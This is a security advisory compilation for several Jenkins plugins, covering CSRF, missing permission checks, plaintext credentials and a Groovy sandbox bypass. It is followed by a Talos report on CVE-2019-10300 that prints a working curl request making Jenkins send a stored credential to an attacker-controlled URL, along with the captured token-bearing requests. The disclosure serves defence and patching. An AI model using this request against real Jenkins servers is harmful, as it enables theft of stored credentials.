* [jira-ext

## Descriptions

### CSRF vulnerability and missing permission checks in GitLab Plugin allowed capturing credentials

**SECURITY-1357
/
CVE-2019-10300 (CSRF) and CVE-2019-10301 (permission check)**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N)

**Affected plugin:
[`gitlab-plugin`](https://plugins.jenkins.io/gitlab-plugin)**

**Description:**

GitLab Plugin did not perform permission checks on a method implementing form validation.
This allowed users with Overall/Read access to Jenkins to connect to an attacker-specified URL using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins.

Additionally, this form validation method did not require POST requests, resulting in a cross-site request forgery vulnerability.

This form validation method now requires POST requests and Overall/Administer permissions.

### jira-ext Plugin stored credentials in plain text

**SECURITY-836
/
CVE-2019-10302**

**Severity (CVSS):**
[Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`jira-ext`](https://plugins.jenkins.io/jira-ext)**

**Description:**

jira-ext Plugin stored credentials unencrypted in its global configuration file `hudson.plugins.jira.JiraProjectProperty.xml` on the Jenkins controller.
These credentials could be viewed by users with access to the Jenkins controller file system.

jira-ext Plugin now stores credentials encrypted.

### Azure PublisherSettings Credentials Plugin stored credentials in plain text

**SECURITY-844
/
CVE-2019-10303**

**Severity (CVSS):**
[Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`azure-publishersettings-credentials`](https://plugins.jenkins.io/azure-publishersettings-credentials)**

**Description:**

Azure PublisherSettings Credentials Plugin stored the service management certificate unencrypted in `credentials.xml` on the Jenkins controller.
These credentials could be viewed by users with access to the Jenkins controller file system.

Azure PublisherSettings Credentials Plugin has been deprecated.
Azure PublisherSettings Credentials Plugin 1.5 no longer provides any user features and we recommend the plugin be uninstalled.

### CSRF vulnerability and missing permission check in XebiaLabs XL Deploy Plugin

**SECURITY-983
/
CVE-2019-10304 (CSRF) and CVE-2019-10305 (permission check)**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)

**Affected plugin:
[`deployit-plugin`](https://plugins.jenkins.io/deployit-plugin)**

**Description:**

A missing permission check in a form validation method in XebiaLabs XL Deploy Plugin allows users with Overall/Read permission to initiate a connection test to an attacker-specified server with attacker-specified credentials.

Additionally, the form validation method does not require POST requests, resulting in a CSRF vulnerability.

### Sandbox bypass in ontrack Jenkins Plugin

**SECURITY-1341
/
CVE-2019-10306**

**Severity (CVSS):**
[High](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Affected plugin:
[`ontrack`](https://plugins.jenkins.io/ontrack)**

**Description:**

ontrack Jenkins Plugin supports sandboxed Groovy expressions.
Its sandbox protection could be circumvented during parsing, compilation, and script instantiation by providing a crafted Groovy script.

This allowed users able to control the pluginâs job-specific configuration to bypass the sandbox protection and execute arbitrary code on the Jenkins controller.

ontrack Jenkins Plugin now uses Script Security APIs that apply sandbox protection during these phases.

# Talos Vulnerability Report

### TALOS-2019-0788

## Jenkins GitLab Plugin Information Disclosure Vulnerability

##### May 6, 2019

##### CVE Number

CVE-2019-10300

### Summary

An exploitable information disclosure vulnerability exists in the `testConnection` functionality of the Jenkins GitLab Plugin 1.5.11. A specially crafted HTTP request from a user with Overall/Read permissions - such as an anonymous user, if enabled - can cause affected versions of this plugin to disclose credentials from the Jenkins credentials database to an attacker controlled server. As this vulnerability is exploitable through HTTP GET request this vulnerability may also be exploited via Cross Site Request Forgery (CSRF).

In order for this attack to be successful, the attacker will need to know the credentials id of the credentials to disclose. This can be found through a number of ways, such as exposed build logs (read), access to the credential manager in the Jenkins UI (read), or through another vulnerable plugin which provides a `fillCredentialsIdItems` style endpoint.

### Tested Versions

Jenkins GitLab Plugin 1.5.11

### Product URLs

<https://plugins.jenkins.io/gitlab-plugin>
<https://github.com/jenkinsci/gitlab-plugin>

### CVSSv3 Score

7.7 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N

### CWE

CWE-285: Improper Authorization

### Details

This vulnerability exists in the `testConnection` endpoint exposed by the `doTestConnection` method of `com.dabsquared.gitlabjenkins.connection.GitLabConnectionConfig` due to missing Jenkins permissions check.

Due to the way in which this plugin expects to authenticate against the remote GitLab instance, the credentials associated with the attacker-specified `credentialsId` are submitted as part of the HTTP `PRIVATE-TOKEN` header to the attacker-controlled server. An example of this attack against a Jenkins 2.165 instance running a vulnerable version of this plugin and configured to allow anonymous read access has been provided below.

```
# Send credentials to an attacker's server (http://127.0.0.1:7000?).
# The trailing '?' is to ensure that the expected path is appended as a
# query parameter, rather than part of the query path.
$ curl -s -X GET -G \
    -d 'url=http://127.0.0.1:7000/?' \
    -d 'clientBuilderId=autodetect' \
    -d 'apiTokenId=532ba431-e25d-4aad-bc74-fb5b2cc03bd7' \
    'http://127.0.0.1:8080/jenkins/descriptorByName/com.dabsquared.gitlabjenkins.connection.GitLabConnectionConfig/testConnection'

```

The request submitted by the plugin to the remote server as an HTTP GET, will appear similar to the following (multiple requests are submitted to the attacker specified server when the `clientBuilderdId` field above is set to `autodetect`).

```
# First request from Jenkins (GET).
/api/v4/user
Accept: application/json
PRIVATE-TOKEN: ASecretTextEntry
Host: 127.0.0.1:7000
Connection: Keep-Alive

# Second request from Jenkins (GET)
/api/v3/user
Accept: application/json
PRIVATE-TOKEN: ASecretTextEntry
Host: 127.0.0.1:7000
Connection: Keep-Alive

```

It is worth noting that as the response from the attacker-specified server is not in the expected format the plugin will raise an error but not render the response.

### Mitigation

Until such time that the vendor produces a patched version, this plugin should be disabled (if possible), or unnecessary users with Overall/Read permissions removed (such as anonymous access).

### Timeline

2019-03-12 - Vendor Disclosure

2019-04-30 - Vendor Patched

2019-05-06 - Public Release
